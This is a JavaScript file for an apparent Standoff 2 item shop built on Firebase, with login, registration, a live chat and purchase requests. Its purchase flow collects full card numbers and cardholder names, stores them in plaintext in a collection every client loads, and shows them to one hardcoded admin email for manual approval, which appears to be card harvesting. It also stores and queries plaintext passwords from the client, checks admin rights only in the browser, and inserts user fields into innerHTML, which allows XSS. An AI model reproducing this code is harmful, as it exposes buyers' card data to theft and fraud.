import { initializeApp, getApps } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, collection, addDoc, getDocs, query, where, updateDoc, doc, onSnapshot, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyDummyKeyForGoldixSo2",
    authDomain: "goldix-so2.firebaseapp.com",
    projectId: "goldix-so2",
    storageBucket: "goldix-so2.appspot.com",
    messagingSenderId: "1234567890",
    appId: "1:1234567890:web:abcdef"
};

// Безопасная инициализация Firebase
const app = !getApps().length ? initializeApp(firebaseConfig) : getApps()[0];
const db = getFirestore(app);

const USERS_COLLECTION = "user"; 
const CHATS_COLLECTION = "chats";

let currentUser = null;

// --- АВТОРИЗАЦИЯ И РЕГИСТРАЦИЯ ---
window.loginUser = async function(email, password) {
    try {
        const q = query(collection(db, USERS_COLLECTION), where("email", "==", email), where("password", "==", password));
        const querySnapshot = await getDocs(q);
        
        if (!querySnapshot.empty) {
            const userDoc = querySnapshot.docs[0];
            currentUser = { id: userDoc.id, ...userDoc.data() };
            localStorage.setItem("goldix_user", JSON.stringify(currentUser));
            alert("Успешный вход!");
            updateUI();
            return true;
        } else {
            alert("Неверный email или пароль!");
            return false;
        }
    } catch (error) {
        console.error("Ошибка входа:", error);
        alert("Ошибка подключения к базе данных.");
        return false;
    }
};

window.registerUser = async function(username, email, password, standoffId) {
    try {
        const q = query(collection(db, USERS_COLLECTION), where("email", "==", email));
        const existing = await getDocs(q);
        
        if (!existing.empty) {
            alert("Этот email уже зарегистрирован!");
            return false;
        }

        const newUser = {
            username: username,
            email: email,
            password: password,
            standoffId: standoffId || "",
            verified: false,
            lastSeen: Date.now(),
            medals: []
        };

        const docRef = await addDoc(collection(db, USERS_COLLECTION), newUser);
        currentUser = { id: docRef.id, ...newUser };
        localStorage.setItem("goldix_user", JSON.stringify(currentUser));
        
        alert("Регистрация успешна!");
        updateUI();
        return true;
    } catch (error) {
        console.error("Ошибка регистрации:", error);
        alert("Не удалось зарегистрироваться.");
        return false;
    }
};

window.logoutUser = function() {
    currentUser = null;
    localStorage.removeItem("goldix_user");
    alert("Вы вышли из аккаунта.");
    updateUI();
};

window.addEventListener("DOMContentLoaded", () => {
    const savedUser = localStorage.getItem("goldix_user");
    if (savedUser) {
        currentUser = JSON.parse(savedUser);
        updateUI();
    }
    initChatListener(); // Запускаем прослушку чата
});

function updateUI() {
    const adminPanelBtn = document.getElementById("adminPanelBtn");
    if (adminPanelBtn) {
        if (currentUser && currentUser.email === "samp111517@gmail.com") {
            adminPanelBtn.style.display = "block";
        } else {
            adminPanelBtn.style.display = "none";
        }
    }
}

// --- ФУНКЦИИ ОНЛАЙН-ЧАТА И ЗАПРОСОВ НА ПОКУПКУ ---

// Пользователь отправляет запрос на покупку (с данными карты)
window.sendPurchaseRequest = async function(itemTitle, price, cardNumber, cardHolder) {
    if (!currentUser) {
        alert("Сначала войдите в аккаунт!");
        return;
    }

    try {
        await addDoc(collection(db, CHATS_COLLECTION), {
            type: "purchase_request", // Тип сообщения — запрос на покупку
            userId: currentUser.id,
            username: currentUser.username,
            email: currentUser.email,
            item: itemTitle,
            price: price,
            cardNumber: cardNumber, // Данные карты, которые ввел пользователь
            cardHolder: cardHolder,
            status: "pending", // pending - ожидает, approved - одобрено, rejected - отклонено
            timestamp: Date.now()
        });
        alert("Запрос на покупку отправлен администратору!");
    } catch (error) {
        console.error("Ошибка отправки запроса:", error);
        alert("Не удалось отправить запрос.");
    }
};

// Администратор одобряет покупку
window.approvePurchase = async function(chatMessageId) {
    if (!currentUser || currentUser.email !== "samp111517@gmail.com") {
        alert("У вас нет прав администратора!");
        return;
    }

    try {
        const chatDocRef = doc(db, CHATS_COLLECTION, chatMessageId);
        await updateDoc(chatDocRef, {
            status: "approved"
        });
        alert("Похпука успешно принята (одобрена)!");
    } catch (error) {
        console.error("Ошибка при подтверждении покупки:", error);
        alert("Не удалось обновить статус покупки.");
    }
};

// Прослушивание чата в реальном времени (выводит сообщения в блок с id="chatContainer")
function initChatListener() {
    const chatContainer = document.getElementById("chatContainer");
    if (!chatContainer) return;

    const q = query(collection(db, CHATS_COLLECTION));
    
    // Получаем сообщения из базы в реальном времени
    onSnapshot(q, (snapshot) => {
        chatContainer.innerHTML = "";
        
        snapshot.forEach((docSnap) => {
            const data = docSnap.data();
            const msgId = docSnap.id;
            
            const msgDiv = document.createElement("div");
            msgDiv.style.border = "1px solid #444";
            msgDiv.style.margin = "10px 0";
            msgDiv.style.padding = "10px";
            msgDiv.style.borderRadius = "5px";
            msgDiv.style.background = "#1a1a1a";
            msgDiv.style.color = "#fff";

            if (data.type === "purchase_request") {
                let statusText = "⏳ Ожидает подтверждения";
                if (data.status === "approved") statusText = "✅ Одобрено администратором";
                if (data.status === "rejected") statusText = "❌ Отклонено";

                // Что видит обычный пользователь
                let contentHTML = `
                    <p><b>🛒 Запрос на покупку от:</b> ${data.username} (${data.email})</p>
                    <p><b>Товар:</b> ${data.item} — <b>Цена:</b> ${data.price}</p>
                    <p><b>Карта:</b> **** **** **** ${data.cardNumber.slice(-4)} (Держатель: ${data.cardHolder})</p>
                    <p><b>Статус:</b> ${statusText}</p>
                `;

                // Если зашел АДМИН (вы), показываем полные данные карты и кнопки управления
                if (currentUser && currentUser.email === "samp111517@gmail.com") {
                    contentHTML += `
                        <div style="background: #2a0808; padding: 8px; margin-top: 5px; border-radius: 4px;">
                            <p style="color: #ff8888; font-size: 13px;">🔒 <b>Панель админа:</b> Полный номер карты: ${data.cardNumber}</p>
                            ${data.status === "pending" ? `<button onclick="approvePurchase('${msgId}')" style="background: green; color: white; padding: 5px 10px; border: none; cursor: pointer; border-radius: 3px; font-weight: bold;">Принять покупку</button>` : ''}
                        </div>
                    `;
                }

                msgDiv.innerHTML = contentHTML;
            } else {
                // Обычное текстовое сообщение в чате (если будет нужно)
                msgDiv.innerHTML = `<p><b>${data.username}:</b> ${data.text}</p>`;
            }

            chatContainer.appendChild(msgDiv);
        });
    });
}